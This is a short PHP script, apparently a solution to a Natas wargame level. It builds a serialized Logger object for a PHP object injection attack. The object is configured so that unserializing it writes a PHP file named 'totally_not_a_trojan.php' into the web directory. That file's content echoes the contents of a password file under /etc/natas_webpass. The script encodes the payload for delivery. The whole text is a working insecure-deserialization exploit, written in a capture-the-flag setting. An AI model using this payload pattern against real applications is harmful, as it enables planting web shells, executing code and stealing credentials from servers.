<?php

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file)
    {
        $this->initMsg = "Hakked";
        $this->exitMsg = "Natas27 Password: <?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/totally_not_a_trojan.php";
    }
}


$obj = new Logger("hax");

file_put_contents("hackityhackhack.txt", urlencode(base64_encode(serialize($obj))));

?>